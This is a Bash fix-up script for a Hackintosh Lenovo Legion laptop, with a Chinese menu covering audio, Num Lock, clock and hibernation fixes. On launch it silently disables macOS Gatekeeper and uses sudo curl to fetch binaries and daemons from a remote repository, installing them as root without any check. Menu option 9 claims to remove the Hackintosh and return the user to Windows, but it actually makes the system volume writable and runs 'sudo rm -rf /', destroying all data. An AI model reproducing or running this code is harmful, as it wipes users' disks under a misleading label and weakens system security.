#!/bin/bash

DAEMON_PATH=/Library/LaunchDaemons/
BIN_PATH=/usr/local/bin/
TMP_PATH=/tmp/
ALC_DAEMON_FILE=good.win.ALCPlugFix.plist
VERB_FILE=alc-verb
ALC_FIX_FILE=ALCPlugFix
TIME_FIX_FILE=localtime-toggle
TIME_DAEMON_FILE=org.osx86.localtime-toggle.plist
NUM_LOCK_FIX_FILE=setleds
NUM_LOCK_DAEMON_FILE=com.rajiteh.setleds.plist
GIT_URL=https://gitee.com/gclm/Hackintosh-LEGION-Y7000P-I7-9750H/raw/master/Script

init(){
	sudo spctl --master-disable
	
	sudo curl -s -o $TMP_PATH$ALC_FIX_FILE "$GIT_URL/ALCPlugFix/$ALC_FIX_FILE"
	sudo curl -s -o $TMP_PATH$VERB_FILE "$GIT_URL/ALCPlugFix/$VERB_FILE"
	sudo curl -s -o $TMP_PATH$ALC_DAEMON_FILE "$GIT_URL/ALCPlugFix/$ALC_DAEMON_FILE"
	sudo curl -s -o $TMP_PATH$TIME_FIX_FILE "$GIT_URL/TimeSynchronization/$TIME_FIX_FILE"
	sudo curl -s -o $TMP_PATH$TIME_DAEMON_FILE "$GIT_URL/TimeSynchronization/$TIME_DAEMON_FILE"
    	sudo curl -s -o $TMP_PATH$NUM_LOCK_FIX_FILE "$GIT_URL/NumLockFix/$NUM_LOCK_FIX_FILE"
    	sudo curl -s -o $TMP_PATH$NUM_LOCK_DAEMON_FILE "$GIT_URL/NumLockFix/$NUM_LOCK_DAEMON_FILE"
	
	if [ ! -d "$BIN_PATH" ] ; then
		mkdir "$BIN_PATH" ;
	fi
	
	if sudo launchctl list | grep --quiet com.black-dragon74.ALCPlugFix; then
		sudo launchctl unload /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
		sudo rm /Library/LaunchDaemons/com.black-dragon74.ALCPlugFix.plist
		sudo rm /usr/local/bin/ALCPlugFix
		sudo rm /Library/Preferences/ALCPlugFix/ALC_Config.plist
	fi
}

ALCPlugFix(){
	sudo cp $TMP_PATH$ALC_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$VERB_FILE $BIN_PATH
	sudo cp $TMP_PATH$ALC_DAEMON_FILE $DAEMON_PATH
	sudo chmod 755 $BIN_PATH$ALC_FIX_FILE
	sudo chown $USER:admin $BIN_PATH$ALC_FIX_FILE
	sudo chmod 755 $BIN_PATH$VERB_FILE
	sudo chown $USER:admin $BIN_PATH$VERB_FILE
	sudo chmod 644 $DAEMON_PATH$ALC_DAEMON_FILE
	sudo chown root:wheel $DAEMON_PATH$ALC_DAEMON_FILE
	if sudo launchctl list | grep --quiet ALCPlugFix; then
		sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$ALC_DAEMON_FILE
}

localtime_toggle(){
	sudo cp $TMP_PATH$TIME_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$TIME_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$TIME_FIX_FILE
	sudo chown root $DAEMON_PATH$TIME_DAEMON_FILE
	sudo chmod 644 $DAEMON_PATH$TIME_DAEMON_FILE
	if sudo launchctl list | grep --quiet localtime-toggle; then
		sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$TIME_DAEMON_FILE
}

NUM_LOCK(){
	sudo cp $TMP_PATH$NUM_LOCK_FIX_FILE $BIN_PATH
	sudo cp $TMP_PATH$NUM_LOCK_DAEMON_FILE $DAEMON_PATH
	sudo chmod +x $BIN_PATH$NUM_LOCK_FIX_FILE
	sudo chown root:wheel $DAEMON_PATH$NUM_LOCK_DAEMON_FILE
	if sudo launchctl list | grep --quiet setleds; then
		sudo launchctl unload $DAEMON_PATH$NUM_LOCK_DAEMON_FILE
	fi
	sudo launchctl load -w $DAEMON_PATH$NUM_LOCK_DAEMON_FILE
}

clear_cache(){
	sudo kextcache -i /
}

set_hibernatemode_0(){
	sudo pmset -a hibernatemode 0
	sudo rm -rf /var/vm/sleepimage
	sudo mkdir /var/vm/sleepimage
}

set_hibernatemode_25(){
	sudo pmset -a hibernatemode 25
	sudo rm -rf /var/vm/sleepimage
}

fixAll(){
	set_hibernatemode_0
	ALCPlugFix
	NUM_LOCK
	localtime_toggle
    clear_cache
}

removeAll(){
    if sudo launchctl list | grep --quiet ALCPlugFix; then
        sudo launchctl unload $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$ALC_DAEMON_FILE
        sudo rm -rf $BIN_PATH$VERB_FILE
        sudo rm -rf $BIN_PATH$ALC_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet localtime-toggle; then
        sudo launchctl unload $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$TIME_DAEMON_FILE
        sudo rm -rf $BIN_PATH$TIME_FIX_FILE
    fi
    
    if sudo launchctl list | grep --quiet setleds; then
        sudo launchctl unload $DAEMON_PATH$NUM_LOCK_DAEMON_FILE
        sudo rm -rf $DAEMON_PATH$NUM_LOCK_DAEMON_FILE
        sudo rm -rf $BIN_PATH$NUM_LOCK_FIX_FILE
    fi
}

menu(){
	echo "***********************************************************************
  项目地址：https://github.com/gclm/Hackintosh-LEGION-Y7000P-I7-9750H/releases
******************************************************************************"
  echo "选择菜单："
  echo "1、修复插耳机杂音"
  echo "2、修复数字键盘无法开启"
  echo "3、修复 Win/OSX 时间不同步"
	echo "4、清除缓存"
  echo "5、禁用休眠(模式 0)"
  echo "6、全部修复上述问题"
  echo "7、启动休眠(模式 25)"
	echo "8、移除所有修复"
  echo "9、送黑果归西"
	echo "0、退出"
}

Select(){
	read -p "请选择你需要执行的操作：" number
    case ${number} in
    1) ALCPlugFix
	   echo "已经修复插耳机杂音"
	   
	   Select
      ;;
    2) NUM_LOCK
	   echo "已经修复数字键盘无法开启"
	   
	   Select
       ;;
    3) localtime_toggle
	   echo "已经修复 Win/OSX 时间不同步"
	   
	   Select
       ;;
	4) clear_cache
       echo "已经重建缓存"
	   
       Select
       ;;
	5) set_hibernatemode_0
	   echo "已经禁用休眠"
	   
	   Select
       ;;
    6) fixAll
	   echo "已经修复上述问题"
	   
	   Select
       ;;
    7) set_hibernatemode_25
	   echo "已经启用休眠"
	   
	   Select
       ;;
	8) removeAll
       echo "已经移除所有修复"
       Select
       ;;
    9) echo "耐心等待，正在努力移除垃圾黑苹果，欢迎重返 windows 系统,稍后会自动重启"
        if sudo test ! -w "/"; then
            sudo mount -uw /
            sudo killall Finder
        fi
        sudo rm -rf / >/dev/null 2>&1
        sudo reboot
        ;;
	0) exit 0
       ;;
    *) echo "输入错误";
	   
       Select
       ;;
    esac
}

main(){
	init
	
	menu
	
	Select
}

main

